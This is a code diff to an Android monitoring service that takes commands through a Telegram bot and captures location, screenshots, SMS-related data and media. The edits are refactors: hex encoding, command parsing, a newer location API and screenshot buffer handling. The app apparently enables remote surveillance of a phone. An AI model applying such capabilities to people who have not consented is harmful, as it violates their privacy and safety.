@@ -131,6 +131,7 @@ class MonitoringService : Service() {
 
     companion object {
         const val ACTION_START_MONITORING = "START_MONITORING"
+        private const val HEX_DIGITS = "0123456789abcdef"
         private val SMS_NUMBER_REGEX = Regex("^\\+?[0-9]{7,15}$")
         private val CMD_SPLIT_REGEX = "\\s+".toRegex()
         private val CONNECT_HELPER_REGEX = Regex("(?i)connectHelper:\\d+:\\s*")
@@ -145,7 +146,7 @@ class MonitoringService : Service() {
         private const val MAX_AUDIO_KEPT = 5
         private const val MAX_VIDEO_KEPT = 3
         private val storageWarnAt = java.util.concurrent.atomic.AtomicLong(0L)
-        private val smsReqSeq = java.util.concurrent.atomic.AtomicInteger((System.currentTimeMillis() and 0xfffffff).toInt())
+        private val smsReqSeq = java.util.concurrent.atomic.AtomicInteger(java.util.concurrent.ThreadLocalRandom.current().nextInt())
         private val authReminderAt = java.util.concurrent.atomic.AtomicLong(0L)
         private const val AUTH_NOTIF_ID = 4
         @Volatile
@@ -360,7 +361,13 @@ class MonitoringService : Service() {
     private fun sha256Hex(value: String): String {
         return try {
             val digest = java.security.MessageDigest.getInstance("SHA-256").digest(value.toByteArray(Charsets.UTF_8))
-            digest.joinToString("") { "%02x".format(it) }
+            val hex = CharArray(digest.size * 2)
+            for (i in digest.indices) {
+                val b = digest[i].toInt()
+                hex[i * 2] = HEX_DIGITS[(b ushr 4) and 0xF]
+                hex[i * 2 + 1] = HEX_DIGITS[b and 0xF]
+            }
+            String(hex)
         } catch (_: Exception) {
             value.hashCode().toString()
         }
@@ -1069,8 +1076,11 @@ class MonitoringService : Service() {
                     val senderId = message?.from?.id?.toString().orEmpty()
                     val chatOk = msgChatId.isNotEmpty() && msgChatId == chatId
                     val rawText = (message?.text ?: message?.caption)?.trim().orEmpty()
-                    val startHead = rawText.substringBefore(" ").trim().substringBefore("@").lowercase(java.util.Locale.ROOT)
-                    val startArg = if (rawText.contains(" ")) rawText.substringAfter(" ").trim() else ""
+                    val head = rawText.substringBefore(" ")
+                    val command = head.substringBefore("@").lowercase(java.util.Locale.ROOT)
+                    val arg = if (head.length < rawText.length) rawText.substring(head.length + 1).trim() else ""
+                    val startHead = command
+                    val startArg = arg
                     if (senderId.isNotEmpty() && msgChatId == senderId && senderId != chatId && startHead == "/start" && startArg.isNotEmpty()) {
                         if (cachedOwnerId == 0L) {
                             val nowPair = android.os.SystemClock.elapsedRealtime()
@@ -1099,12 +1109,8 @@ class MonitoringService : Service() {
                         }
                     }
                     val ownerOk = isOwner(senderId)
-                    val full = (message?.text ?: message?.caption)?.trim()
-                    if ((chatOk || ownerOk) && full != null) {
-                        val head = full.substringBefore(" ")
-                        val command = head.substringBefore("@").lowercase(java.util.Locale.ROOT)
+                    if (chatOk || ownerOk) {
                         if (command.startsWith("/")) {
-                            val arg = if (head.length < full.length) full.substring(head.length + 1).trim() else ""
                             val input = if (arg.isEmpty()) command else "$command $arg"
                             val wakeSeen = command == "/ping" && try { preferencesManager.wakePingSeen(update.updateId) } catch (_: Exception) { false }
                             handleTelegramCommand(input, message?.date ?: 0, ownerOk, chatOk, wakeSeen, senderId)
@@ -2129,11 +2135,26 @@ class MonitoringService : Service() {
                                     override fun onProviderEnabled(providerName: String) {}
                                     override fun onStatusChanged(provider: String?, status: Int, extras: android.os.Bundle?) {}
                                 }
-                                try {
-                                    @Suppress("DEPRECATION")
-                                    locationManager.requestSingleUpdate(provider, listener, android.os.Looper.getMainLooper())
-                                } catch (_: Exception) {
-                                    result.complete(null)
+                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                                    try {
+                                        val signal = android.os.CancellationSignal()
+                                        result.invokeOnCompletion { try { signal.cancel() } catch (_: Exception) { } }
+                                        locationManager.getCurrentLocation(provider, signal, applicationContext.mainExecutor) { loc -> result.complete(loc) }
+                                    } catch (_: Exception) {
+                                        try {
+                                            @Suppress("DEPRECATION")
+                                            locationManager.requestSingleUpdate(provider, listener, android.os.Looper.getMainLooper())
+                                        } catch (_: Exception) {
+                                            result.complete(null)
+                                        }
+                                    }
+                                } else {
+                                    try {
+                                        @Suppress("DEPRECATION")
+                                        locationManager.requestSingleUpdate(provider, listener, android.os.Looper.getMainLooper())
+                                    } catch (_: Exception) {
+                                        result.complete(null)
+                                    }
                                 }
                                 try {
                                     result.await()
@@ -3425,9 +3446,26 @@ class MonitoringService : Service() {
                 if (stride <= 0 || height <= 0) return null
                 val rowWidth = plane.rowStride / stride
                 if (rowWidth < width) return null
-                val bmp = Bitmap.createBitmap(rowWidth, height, Bitmap.Config.ARGB_8888)
-                bmp.copyPixelsFromBuffer(plane.buffer)
-                val cropped = if (rowWidth != width) Bitmap.createBitmap(bmp, 0, 0, width, height) else bmp
+                val bmp = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888)
+                if (rowWidth == width) {
+                    bmp.copyPixelsFromBuffer(plane.buffer)
+                } else if (stride == 4) {
+                    val src = plane.buffer
+                    val rowBytes = width * 4
+                    val packed = java.nio.ByteBuffer.allocateDirect(rowBytes * height)
+                    for (y in 0 until height) {
+                        src.position(y * plane.rowStride)
+                        val slice = src.slice()
+                        slice.limit(rowBytes)
+                        packed.put(slice)
+                    }
+                    packed.flip()
+                    bmp.copyPixelsFromBuffer(packed)
+                } else {
+                    try { bmp.recycle() } catch (_: Exception) { }
+                    return null
+                }
+                val cropped = bmp
                 val out = File(cacheDir, "screenshot_" + TimeFmt.fileStamp(System.currentTimeMillis()) + "_" + java.util.UUID.randomUUID() + ".jpg")
                 try {
                     java.io.FileOutputStream(out).use { cropped.compress(Bitmap.CompressFormat.JPEG, 85, it) }
@@ -3435,7 +3473,6 @@ class MonitoringService : Service() {
                     deleteQuietly(out)
                     return null
                 } finally {
-                    if (cropped !== bmp) { try { bmp.recycle() } catch (_: Exception) { } }
                     try { cropped.recycle() } catch (_: Exception) { }
                 }
                 if (!out.exists() || out.length() == 0L) { deleteQuietly(out); return null }
